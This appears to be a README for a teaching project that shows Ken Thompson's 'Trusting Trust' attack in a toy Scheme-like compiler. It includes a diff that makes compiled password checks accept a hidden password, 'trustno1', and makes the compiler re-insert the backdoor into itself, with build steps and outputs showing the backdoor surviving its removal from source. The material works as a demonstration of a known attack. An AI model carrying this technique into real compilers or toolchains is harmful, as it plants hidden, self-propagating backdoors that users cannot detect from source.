# Trusting Trust Experiment

## Motivation

Can Ken Thompson's famous Turing Award Lecture, [Reflections on Trusting
Trust](https://www.cs.cmu.edu/~rdriley/487/papers/Thompson_1984_ReflectionsonTrustingTrust.pdf),
be demonstrated concretely in x?

Yes!

That is, we can demonstrate a compiler backdoor that inserts itself in all
future versions of the compiler, even after the hack is removed from the source
code.

## Usage

### Clean Behavior

First, see [`su.x`](./su.x):

```scheme
(print "Enter root password: ")
(define pass (string (read)))
(if (equal? pass "r007p4$$")
  (println "Root access granted!")
  (println "Access denied"))
```

Observe that, when compiled by an unaffected compiler, `xc0`, it only accepts
the password in its source code: `r007p4$$`

```bash
./xs -o /tmp/xc0 < <(cat xc.x xc.x)
/tmp/xc0 -o /tmp/su0 < su.x
```

It should behave like this:

```
$ /tmp/su0
Enter root password: foo
Access denied

$ /tmp/su0
Enter root password: r007p4$$
Root access granted!

$ /tmp/su0
Enter root password: trustno1
Access denied                  # <- backdoor is NOT present
```

### The Backdoor

Now, we will insert a compiler backdoor that causes `su.x` to accept the
backdoor password: `trustno1`

First, see the [hack](./hack.diff) itself:

```scheme
(define (emit sexpr env)

  ;;; BEGIN TRUSTING TRUST HACK
  (define hack '(
    (if (and (list? sexpr)
             (equal? (first sexpr) 'equal?)
             (equal? (second sexpr) 'pass))
      (set! sexpr (list 'or '(equal? "trustno1" pass) (list 'equal? (third sexpr) 'pass))))
    (if (and (list? sexpr)
             (equal? (car sexpr) 'define)
             (list? (cadr sexpr))
             (equal? (caadr sexpr) 'emit))
        (set! sexpr (append (list 'define (cadr sexpr))
                            (list (list 'define 'hack (list 'quote hack)))
                            hack
                            (cddr sexpr))))))
  (if (and (list? sexpr)
           (equal? (first sexpr) 'equal?)
           (equal? (second sexpr) 'pass))
    (set! sexpr (list 'or '(equal? "trustno1" pass) (list 'equal? (third sexpr) 'pass))))
  (if (and (list? sexpr)
           (equal? (car sexpr) 'define)
           (list? (cadr sexpr))
           (equal? (caadr sexpr) 'emit))
      (set! sexpr (append (list 'define (cadr sexpr))
                          (list (list 'define 'hack (list 'quote hack)))
                          hack
                          (cddr sexpr))))
  ;;; END TRUSTING TRUST HACK

  ;;; ... the rest of the normal emit definition ...
)
```

It does two things, mirroring the two properties described in Thompson's
lecture:

1. Injects a bug to make password checks pass with `trustno1`
2. Injects a bug that injects #1 and #2 of this list when compiling the compiler.

That second one takes a second to grok.

This results in a backdoor which persists even when removed from the source code.

Let's see that in practice.

### Inject the Backdoor

Create the first infected compiler `xc1` by applying the hack to the source
code and building the compiler based on this infected source code.

```bash
git -C ../.. apply < hack.diff
/tmp/xc0 -o /tmp/xc1 < xc.x
```

Now, if we compile `su.x` using the infected `xc1` compiler:

```bash
/tmp/xc1 -o /tmp/su1 < su.x
```

One can see that `su1` now behaves just like `su0` but now _also_ accepts the
backdoor password: `trustno1`

```
$ /tmp/su1
Enter root password: foo
Access denied

$ /tmp/su1
Enter root password: r007p4$$
Root access granted!

$ /tmp/su1
Enter root password: trustno1
Root access granted!           # <-- Backdoor works!
```

### Remove The Backdoor (From Source)

Revert the source code change such that the source code has no record of
the backdoor having ever been there.

```bash
git -C ../.. apply -R < hack.diff
```

### Backdoor Propagates Itself

Now, even though the backdoor no longer exists in the source code, if we use
the infected `xc1` compiler to create the next compiler `xc2`, which is then
used to build `su2`, we can see that the backdoor persists! 

Again, the backdoor persists even though there is no trace of it left in the
source code. The original backdoor injected into `xc1` propagates itself into
all future versions of the compiler even when compiling perfectly clean source
code.

To see this, build `xc2` using the infected `xc1` compiler and build `su2` using `xc2`.

```bash
/tmp/xc1 -o /tmp/xc2 < xc.x
/tmp/xc2 -o /tmp/su2 < su.x
```

We can see `su2`, compiled with `xc2` based on clean `xc.x` source code, is
_still_ affected:

```
$ /tmp/su2
Enter root password: foo
Access denied

$ /tmp/su2
Enter root password: r007p4$$
Root access granted!

$ /tmp/su2
Enter root password: trustno1
Root access granted!           # <- Backdoor _still_ works!
```

### Sanity Check: Back to Clean

As a final sanity check, if we use the clean `xc0` compiler again, we **do**
get back to a `su` that only accepts the proper password.

```bash
/tmp/xc0 -o /tmp/su3 < su.x
```

```
$ /tmp/su3
Enter root password: foo
Access denied

$ /tmp/su3
Enter root password: r007p4$$
Root access granted!

$ /tmp/su3
Enter root password: trustno1
Access denied                  # <- Backdoor is NOT present
```

## Reflections on Reflections on Trusting Trust

It's wild that this is achievable with such a small diff and works just as
described in the lecture.

For sure, this proof of concept is sensitive to source code naming conventions
and layouts, but it _does_ result in a working backdoor, and experiencing that
happen right in front of you is frankly pretty spooky.

